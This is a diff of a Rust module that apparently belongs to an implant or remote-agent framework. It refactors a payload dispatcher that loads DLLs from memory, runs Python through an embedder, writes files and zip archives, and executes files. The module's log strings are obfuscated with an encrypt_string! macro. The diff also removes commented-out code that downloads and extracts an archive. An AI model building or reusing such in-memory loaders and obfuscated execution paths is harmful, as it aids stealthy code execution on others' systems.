@@ -41,11 +41,9 @@ pub enum PayloadExec {
     Thread(thread::JoinHandle<()>, Payload),
 }
 
-//TODO remove the () and Empty
 #[derive(Serialize, Deserialize, Debug, Clone)]
 pub enum Payload {
     DllFromMemory(DllFromMemory),
-    //DownloadAndExec(DownloadAndExec),
     ExecPython(ExecPython),
     Banner(),
     WriteZip(WriteZip),
@@ -54,17 +52,14 @@ pub enum Payload {
 }
 impl Payload {
     pub fn exec_payload(&self) -> PayloadExec {
-        //TODO return all data
         let exec_result = match &self {
             Payload::DllFromMemory(payload) => payload.dll_from_memory(),
-            //Payload::DownloadAndExec(payload) => payload.download_and_exec(),
-            Payload::ExecPython(payload) => payload.deploy_embedder(),
+            Payload::ExecPython(payload) => payload.exec_python_with_embedder(),
             Payload::Banner() => banner(),
             Payload::WriteZip(payload) => payload.write_zip(),
             Payload::WriteFile(payload) => payload.write_file(),
             Payload::Exec(payload) => payload.exec_file(),
         };
-        //    Ok(PayloadExec::NoThread())
         match exec_result {
             Ok(a) => a,
             Err(e) => {
@@ -160,8 +155,7 @@ impl DllFromMemory {
             debug!("{}{}", encrypt_string!("DLL result = "), result);
             return Ok(PayloadExec::NoThread());
         }
-        //TODO quand on part d'ici, il y a un probleme
-        //info!("{}", encrypt_string!("-> TODO repair unsafe"));
+        // TODO quand on part d'ici, il y a un probleme
     }
 }
 
@@ -173,7 +167,7 @@ pub struct ExecPython {
 }
 impl ExecPython {
     #[cfg(target_os = "linux")]
-    pub fn deploy_embedder(&self) -> Result<PayloadExec, anyhow::Error> {
+    pub fn exec_python_with_embedder(&self) -> Result<PayloadExec, anyhow::Error> {
         error!(
             "{}",
             encrypt_string!("!Its linux, impossible to run this payload: deploy_embedder")
@@ -182,12 +176,8 @@ impl ExecPython {
     }
 
     #[cfg(target_os = "windows")]
-    pub fn deploy_embedder(&self) -> Result<PayloadExec, anyhow::Error> {
-        //let _ = self.download_and_unzip_python();
+    pub fn exec_python_with_embedder(&self) -> Result<PayloadExec, anyhow::Error> {
         let path: PathBuf = calculate_path(&self.path)?;
-        //let st  = p.display().to_string();
-        //let path  = st.as_str();
-        //let path: &str = &p.to_str().unwrap();
 
         info!(
             "{}{}\n",
@@ -206,25 +196,6 @@ impl ExecPython {
             return Ok(PayloadExec::NoThread());
         }
     }
-    /*
-    pub fn download_and_unzip_python(&self) -> Result<(), anyhow::Error> {
-        info!("{}", encrypt_string!("download_and_unzip_python"));
-        let archive: Vec<u8> = self.link.fetch_data()?;
-        let target_dir = PathBuf::from(&self.python_path); // Doesn't need to exist
-
-        match zip_extract::extract(Cursor::new(archive), &target_dir, true) {
-            Ok(_) => {}
-            Err(error) => {
-                error!(
-                    "{}{}",
-                    encrypt_string!("error to unzip python lib: "),
-                    error
-                )
-            }
-        }
-        Ok(())
-    }
-     */
 }
 
 pub fn banner() -> Result<PayloadExec, anyhow::Error> {
@@ -269,25 +240,9 @@ pub struct WriteZip {
     pub path: String,
 }
 
-/*        info!("{}", encrypt_string!("download_and_unzip_python"));
-       let archive: Vec<u8> = self.link.fetch_data()?;
-       let target_dir = PathBuf::from(&self.out_filepath); // Doesn't need to exist
-
-       match zip_extract::extract(Cursor::new(archive), &target_dir, true) {
-           Ok(_) => {}
-           Err(error) => {
-               error!(
-                   "{}{}",
-                   encrypt_string!("error to unzip python lib: "),
-                   error
-               )
-           }
-       }
-*/
-
 impl WriteZip {
     pub fn write_zip(&self) -> Result<PayloadExec, anyhow::Error> {
-        //TODO verify if file already exist and calculate hash before replacing it.
+        //TODO found a way, not to recreate everything every time this payload run
         let path: PathBuf = calculate_path(&self.path)?;
         let _ = create_diretory(&path)?;
 
@@ -318,7 +273,6 @@ pub struct WriteFile {
 
 impl WriteFile {
     pub fn write_file(&self) -> Result<PayloadExec, anyhow::Error> {
-        //TODO verify if file already exist and calculate hash before replacing it.
         let path: PathBuf = calculate_path(&self.path)?;
 
         if same_hash_sha512(&self.hash, &path) == false {
